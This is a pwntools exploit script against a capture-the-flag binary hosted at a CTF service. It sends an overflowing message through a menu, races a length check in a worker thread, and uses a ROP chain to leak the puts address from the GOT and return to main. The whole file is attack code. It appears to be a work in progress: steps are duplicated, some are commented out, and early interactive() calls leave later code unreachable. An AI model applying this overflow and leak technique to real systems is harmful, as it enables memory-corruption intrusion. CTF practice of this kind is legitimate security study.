from pwn import *

def step(s):
    log.warning(f">>> {s}")

context.arch = "amd64"

io = remote("nc1.ctfplus.cn", 32346)

elf = ELF("./pwn")
rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address

global_msg_buf_size = 200
dest_buf_siz = 32


def mark(s):
    log.info(f"========== {s} ==========")


# =========================
# Stage 1
# =========================

mark("S1: set payload")

payload1 = flat(
    b"A" * 40,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
).ljust(200, b"A")

io.sendlineafter(b"Choice: ", b"1")
log.info("sent choice 1")

io.sendafter(b"Message (max 200 bytes): ", payload1)
log.info("sent payload1")

io.sendlineafter(b"Choice: ", b"2")
log.info("sent choice 2")

io.sendlineafter(b"Length: ", b"32")
log.info("set length = 32")

io.sendlineafter(b"Choice: ", b"3")
log.info("triggered worker1")

step("A: wait Choice")
io.sendlineafter(b"Choice: ", b"1")

step("B: send payload")
io.sendafter(b"Message (max 200 bytes): ", payload1)

step("C: wait Choice")
io.sendlineafter(b"Choice: ", b"2")

step("D: send 32")
io.sendlineafter(b"Length: ", b"32")

step("E: wait Choice")
io.sendlineafter(b"Choice: ", b"3")

step("F: wait worker check")
io.recvuntil(b"Length check passed! Preparing to copy...")

# step("G: wait Choice")
# io.sendlineafter(b"Choice: ", b"2")

# step("H: wait Length")
# io.sendlineafter(b"Length: ", b"200")

# step("G: wait Choice")
# io.sendlineafter(b"Choice: ", b"2")

step("G: raw recv")

data = io.recvrepeat(1.0)
print(repr(data))

step("G2: send 2")
io.sendline(b"2")

io.interactive()

sleep(0.5)

step("H: dump whatever arrived")
data = io.clean(timeout=0.2)
print(repr(data))

io.interactive()

step("I: wait Copy done")
io.recvuntil(b"Copy done! Exiting thread...")

step("J: recv leak")
leak = io.recv(6)

step("K: wait main")
io.recvuntil(b"Choice: ")

log.success(f"puts = {hex(u64(leak.ljust(8,b'\\0')))}")
log.success("MAIN ALIVE")